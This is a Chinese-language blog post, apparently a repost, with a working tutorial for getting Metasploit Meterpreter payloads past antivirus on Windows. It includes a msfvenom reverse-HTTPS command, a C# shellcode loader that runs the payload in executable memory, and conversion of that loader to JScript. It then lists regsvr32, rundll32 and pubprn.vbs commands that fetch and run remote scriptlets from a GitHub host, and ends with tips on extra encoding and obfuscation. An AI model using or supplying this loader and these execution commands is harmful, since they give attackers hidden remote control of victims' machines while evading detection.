<!doctype html><html lang=zh><meta charset=utf-8><meta name=generator content="Hugo 0.64.0"><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name=color-scheme content="light dark"><meta name=supported-color-schemes content="light dark"><title>免杀 MSF Windows Payload 的方法与实践&nbsp;&ndash;&nbsp;WTFSec</title><link rel=stylesheet href=/css/core.min.805532cf9875da8b5e05e28993cdaa5eaf6cb6fd1e14df60b32344efecb93dba87ec77e53ac2336494eb82526410e16c.css integrity=sha384-gFUyz5h12oteBeKJk82qXq9stv0eFN9gsyNE7+y5PbqH7HflOsIzZJTrglJkEOFs><body><div class=base-body><section id=header class="site header"><div class="header wrap"><span class="header left-side"><a class="site home" href=/><span class="site name">WTFSec</span></a></span>
<span class="header right-side"><div class="nav wrap"><nav class=nav><a class="nav item" href=/categories/>分类</a><a class="nav item" href=/tags/>标签</a><a class="nav item" href=/link/>友链</a>
<input placeholder="Google 站内搜索" id=search_input style=width:150px>
<button onclick=search()><svg width="13" height="13" viewBox="0 0 13 13"><title>搜尋</title><path d="m4.8495 7.8226c.82666.0 1.5262-.29146 2.0985-.87438.57232-.58292.86378-1.2877.87438-2.1144.010599-.82666-.28086-1.5262-.87438-2.0985-.59352-.57232-1.293-.86378-2.0985-.87438-.8055-.010599-1.5103.28086-2.1144.87438-.60414.59352-.8956 1.293-.87438 2.0985.021197.8055.31266 1.5103.87438 2.1144.56172.60414 1.2665.8956 2.1144.87438zm4.4695.2115 3.681 3.6819-1.259 1.284-3.6817-3.7.0019784-.69479-.090043-.098846c-.87973.76087-1.92 1.1413-3.1207 1.1413-1.3553.0-2.5025-.46363-3.4417-1.3909s-1.4088-2.0686-1.4088-3.4239.4696-2.4966 1.4088-3.4239c.9392-.92727 2.0864-1.3969 3.4417-1.4088 1.3553-.011889 2.4906.45771 3.406 1.4088.9154.95107 1.379 2.0924 1.3909 3.4239.0 1.2126-.38043 2.2588-1.1413 3.1385l.098834.090049z"/></svg></button></nav></div><script>function search(){const search_value=document.getElementById("search_input").value;if(search_value!==''){window.open("/search/?q="+search_value,"_blank");}}
document.getElementById("search_input").addEventListener("keydown",function(e){if(e.key==="Enter"){search()}});</script></span></div></section><div id=content><section class="article header"><h1 class="article title">免杀 MSF Windows Payload 的方法与实践</h1><p class="article date"><span class=lang><a>Hzllaga</a> </span>Tuesday, August 7, 2018</p></section><article class="article markdown-body"><p>MSF 已经是广为人知的非常流行的渗透平台，没有之一。而作为专注于后渗透的我，最常用的也是 MSF 强大的后渗透功能。在实战当中，经常需要在目标环境中获取一个 Meterpreter 的 shell。那么我面临的第一个问题，就是如何安安稳稳地、神不知鬼不觉地在目标环境中执行 Meterpreter 的 Payload。目前网上流行的免杀和隐蔽执行的思路有很多，今天我给大家介绍一下我屡试不爽的猥琐流方法。</p><h2 id=准备-payload>准备 Payload</h2><p>这个过程比较简单，大多数人应该都会。我们这里使用 msfvenom 生成一个 x86 的 Meterpreter 的 Payload 为例，直接上命令：<div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>msfvenom  -p windows/meterpreter/reverse_https -a x86 -f csharp --platform windows -o https.csharp -b <span class=s2>&#34;\x00\xff&#34;</span> <span class=nv>LHOST</span><span class=o>=</span>192.168.1.222 <span class=nv>LPORT</span><span class=o>=</span><span class=m>443</span> <span class=nv>PrependMigrate</span><span class=o>=</span><span class=nb>true</span> <span class=nv>PrependMigrateProc</span><span class=o>=</span>svchost.exe</code></pre></div>大部分参数都不用过多解释了，常用 MSF 的人都知道。需要说明的是，我们要借助于 C# 来执行生成的 Payload，所以格式要选择为 csharp，而最后两个参数（PrependMigrate 和 PrependMigrateProc）是指明 Payload 执行后要将自己注入到一个新创建的宿主 svchost.exe 进程中去。 生成的结果如下图（cat 命令显示的结果有问题，不用管它）：<a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200222165439.png><img src=https://cdn.wtfsec.org/img/20200222165439.png alt></a></p><h2 id=准备-c-工程>准备 C# 工程</h2><p>我们需要创建一个 C# 工程，我这里使用 Visual Studio 2017。新建一个空白的 C# 的 Console 工程，.Net Framework 版本选择 2.0（保证兼容性）。 将如下代码黏贴覆盖到 Program.cs 中：<div class=highlight><pre class=chroma><code class=language-csharp data-lang=csharp><span class=k>using</span> <span class=nn>System</span><span class=p>;</span>
<span class=k>using</span> <span class=nn>System.Threading</span><span class=p>;</span>
<span class=k>using</span> <span class=nn>System.Runtime.InteropServices</span><span class=p>;</span>
<span class=k>namespace</span> <span class=nn>MSFWrapper</span>
<span class=p>{</span>
    <span class=k>public</span> <span class=k>class</span> <span class=nc>Program</span>
    <span class=p>{</span>
        <span class=k>public</span> <span class=n>Program</span><span class=p>(</span><span class=p>)</span>
        <span class=p>{</span>
           <span class=n>RunMSF</span><span class=p>(</span><span class=p>)</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=k>public</span> <span class=k>static</span> <span class=k>void</span> <span class=n>RunMSF</span><span class=p>(</span><span class=p>)</span>
        <span class=p>{</span>
            <span class=kt>byte</span><span class=p>[</span><span class=p>]</span> <span class=n>MsfPayload</span> <span class=p>=</span> <span class=p>{</span>
            <span class=c1>//Paste your Payload here
</span><span class=c1></span>        <span class=p>}</span><span class=p>;</span>
            <span class=n>IntPtr</span> <span class=n>returnAddr</span> <span class=p>=</span> <span class=n>VirtualAlloc</span><span class=p>(</span><span class=p>(</span><span class=n>IntPtr</span><span class=p>)</span><span class=m>0</span><span class=p>,</span> <span class=p>(</span><span class=kt>uint</span><span class=p>)</span><span class=n>Math</span><span class=p>.</span><span class=n>Max</span><span class=p>(</span><span class=n>MsfPayload</span><span class=p>.</span><span class=n>Length</span><span class=p>,</span> <span class=m>0</span><span class=n>x1000</span><span class=p>)</span><span class=p>,</span> <span class=m>0</span><span class=n>x3000</span><span class=p>,</span> <span class=m>0</span><span class=n>x40</span><span class=p>)</span><span class=p>;</span>
            <span class=n>Marshal</span><span class=p>.</span><span class=n>Copy</span><span class=p>(</span><span class=n>MsfPayload</span><span class=p>,</span> <span class=m>0</span><span class=p>,</span> <span class=n>returnAddr</span><span class=p>,</span> <span class=n>MsfPayload</span><span class=p>.</span><span class=n>Length</span><span class=p>)</span><span class=p>;</span>
            <span class=n>CreateThread</span><span class=p>(</span><span class=p>(</span><span class=n>IntPtr</span><span class=p>)</span><span class=m>0</span><span class=p>,</span> <span class=m>0</span><span class=p>,</span> <span class=n>returnAddr</span><span class=p>,</span> <span class=p>(</span><span class=n>IntPtr</span><span class=p>)</span><span class=m>0</span><span class=p>,</span> <span class=m>0</span><span class=p>,</span> <span class=p>(</span><span class=n>IntPtr</span><span class=p>)</span><span class=m>0</span><span class=p>)</span><span class=p>;</span>
            <span class=n>Thread</span><span class=p>.</span><span class=n>Sleep</span><span class=p>(</span><span class=m>2</span><span class=m>0</span><span class=m>0</span><span class=m>0</span><span class=p>)</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=k>public</span> <span class=k>static</span> <span class=k>void</span> <span class=n>Main</span><span class=p>(</span><span class=p>)</span>
        <span class=p>{</span>
        <span class=p>}</span>
<span class=na>        [DllImport(&#34;kernel32.dll&#34;)]</span>
        <span class=k>public</span> <span class=k>static</span> <span class=k>extern</span> <span class=n>IntPtr</span> <span class=n>VirtualAlloc</span><span class=p>(</span><span class=n>IntPtr</span> <span class=n>lpAddress</span><span class=p>,</span> <span class=kt>uint</span> <span class=n>dwSize</span><span class=p>,</span> <span class=kt>uint</span> <span class=n>flAllocationType</span><span class=p>,</span> <span class=kt>uint</span> <span class=n>flProtect</span><span class=p>)</span><span class=p>;</span>
<span class=na>        [DllImport(&#34;kernel32.dll&#34;)]</span>
        <span class=k>public</span> <span class=k>static</span> <span class=k>extern</span> <span class=n>IntPtr</span> <span class=n>CreateThread</span><span class=p>(</span><span class=n>IntPtr</span> <span class=n>lpThreadAttributes</span><span class=p>,</span> <span class=kt>uint</span> <span class=n>dwStackSize</span><span class=p>,</span> <span class=n>IntPtr</span> <span class=n>lpStartAddress</span><span class=p>,</span> <span class=n>IntPtr</span> <span class=n>lpParameter</span><span class=p>,</span> <span class=kt>uint</span> <span class=n>dwCreationFlags</span><span class=p>,</span> <span class=n>IntPtr</span> <span class=n>lpThreadId</span><span class=p>)</span><span class=p>;</span>
    <span class=p>}</span>
<span class=p>}</span>
</code></pre></div>然后将先前生成的 Payload 的黏贴到代码中注释为“//Paste your Payload here”的地方。保存代码后，修改该工程的属性，将输出类型改为“Windows 应用程序”，启动对象改为“MSFWrapper.Program”, 然后保存。 增加 Release 版的 x86 编译对象，然后生成出 MSFWrapper.exe。</p><h2 id=转换-msfwrapperexe-为-js-文件>转换 MSFWrapper.exe 为 js 文件</h2><p>这里要用到一个非常流弊的工具 DotNetToJScript，这是一款可以将 .net 程序转换为 jscript 代码的。工具下载地址：<a href=https://github.com/tyranid/DotNetToJScript target=_blank>Github</a>
使用如下命令进行转换：<div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>DotNetToJScript.exe -l<span class=o>=</span>JScript -o<span class=o>=</span>MSFWrapper.js -c<span class=o>=</span>MSFWrapper.Program MSFWrapper.exe</code></pre></div>然后我们就可以用下面的命令执行我们的 MSF Payload：<div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>C:<span class=se>\w</span>indows<span class=se>\S</span>ysWOW64<span class=se>\c</span>script.exe /e:JScript MSFWrapper.js</code></pre></div>这里一定要注意，因为我们生成的 Payload 跟 exe 都是 32 位的，所以这里也要用 32 的 cscript.exe 去执行。切记！</p><h2 id=进一步猥琐化>进一步猥琐化</h2><p>sct 大法 既然能够转换为 js 代码，那么我们自然会想到 sct 大法的应用。我们将转换后的 js 代码黏贴到下面代码中的“//paste code here”：<div class=highlight><pre class=chroma><code class=language-xml data-lang=xml><span class=cp>&lt;?XML version=&#34;1.0&#34;?&gt;</span>
<span class=nt>&lt;scriptlet</span><span class=nt>&gt;</span>
<span class=nt>&lt;registration</span> 
    <span class=na>progid=</span><span class=s>&#34;Msf&#34;</span>
    <span class=na>classid=</span><span class=s>&#34;{F0001111-0000-0000-0000-0000FEEDACDC}&#34;</span> <span class=nt>&gt;</span>
    <span class=nt>&lt;script</span> <span class=na>language=</span><span class=s>&#34;JScript&#34;</span><span class=nt>&gt;</span>
    //paste code here
    <span class=nt>&lt;/script&gt;</span>
<span class=nt>&lt;/registration&gt;</span>
<span class=nt>&lt;/scriptlet&gt;</span></code></pre></div>保存为 msf.sct（后缀名可以更改，比如 jpg 等）并上传至 Web Server 然后在目标机器上执行如下命令：<div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>c:<span class=se>\w</span>indows<span class=se>\S</span>ysWOW64<span class=se>\r</span>egsvr32 /s /u /n /i:https://raw.githubusercontent.com/Moriarty2016/Screenshots/master/msf.sct c:<span class=se>\w</span>indows<span class=se>\S</span>ysWOW64<span class=se>\s</span>crobj.dll<span class=s1>&#39;&#39;</span></code></pre></div>Bingo！ 另外，我们也可以使用 script 或者 scriptlet 的方式来深度利用，这里我们要使用 DotNetToJSCript.exe 的 -m 参数来生成 scriptlet 文件，命令如下：<div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>DotNetToJScript.exe -m -o<span class=o>=</span>msf2.sct -c<span class=o>=</span>MSFWrapper.Program MSFWrapper.exe</code></pre></div>将 msf2.sct 文件上传到 Web Server 上，然后用如下命令在目标环境中执行：<div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>c:<span class=se>\w</span>indows<span class=se>\s</span>yswow64<span class=se>\r</span>undll32.exe javascript:<span class=s2>&#34;\..\mshtml,RunHTMLApplication &#34;</span><span class=p>;</span>document.write<span class=o>(</span><span class=o>)</span><span class=p>;</span>GetObject<span class=o>(</span><span class=s2>&#34;script:https://raw.githubusercontent.com/Moriarty2016/Screenshots/master/msf2.sct&#34;</span><span class=o>)</span><span class=p>;</span>this.close<span class=o>(</span><span class=o>)</span></code></pre></div>Bingo!Bingo! 当然，如果目标环境是 Windows 7 以上版本，还可以这样：<div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>c:<span class=se>\w</span>indows<span class=se>\S</span>ysWOW64<span class=se>\c</span>script.exe c:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\P</span>rinting_Admin_Scripts<span class=se>\z</span>h-CN<span class=se>\p</span>ubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/Moriarty2016/Screenshots/master/msf2.sct</code></pre></div>Bingo!Bingo!Bingo!</p><h2 id=关于深度免杀>关于深度免杀</h2><p>一般情况下按照上述方法，基本就可以免杀了。如果还有特殊要求的话，可以考虑做如下的额外工作： 考虑对 MSF 生成的 Payload 用 MSF 自带的编码器进行编码，或者自己自定义方式去编码。 然后 base64 编码后，放入 C# 代码中。 生成的 js 代码可以进行模糊编码处理。 总之，一旦将二进制的东西变成脚本之后，免杀起来就会非常的简单！自己去发挥吧！</p><section class="article labels"><a class=category href=/categories/%E8%BD%AC%E8%BD%BD/>转载</a><a class=tag href=/tags/%E5%85%8D%E6%9D%80/>免杀</a><a class=tag href=/tags/payload/>Payload</a><a class=tag href=/tags/shellcode/>shellcode</a><a class=tag href=/tags/metasploit/>Metasploit</a></section></article><div class="article navigation"><p><a class=link href=/posts/php-gzinflate%E5%8A%A0%E5%AF%86%E8%84%9A%E6%9C%AC/><span class=li>&larr;</span>PHP gzinflate加密脚本</a><p><a class=link href=/posts/mimikatz%E5%85%8D%E6%9D%80/><span class=li>&rarr;</span>Mimikatz免杀</a></p></div></div><section id=footer class=footer><div class=footer-wrap><p class=copyright>©2014-2020 WTFSec.</p><p class=powerby><span>Powered by </span><a href=https://gohugo.io target=_blank>Hugo</a><span> and the </span><a href=https://themes.gohugo.io/hugo-notepadium/ target=_blank>Notepadium</a></p><p class=powerby><span>CDN by </span><a href=https://cf.wtfsec.org target=_blank>Cloudflare</a><span> and </span><a href="https://console.upyun.com/register/?invite=H1xhvqTVV" target=_blank>又拍云</a></p></div></section><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-83215806-1','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script data-ad-client=ca-pub-4220670081232153 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></div></body></html>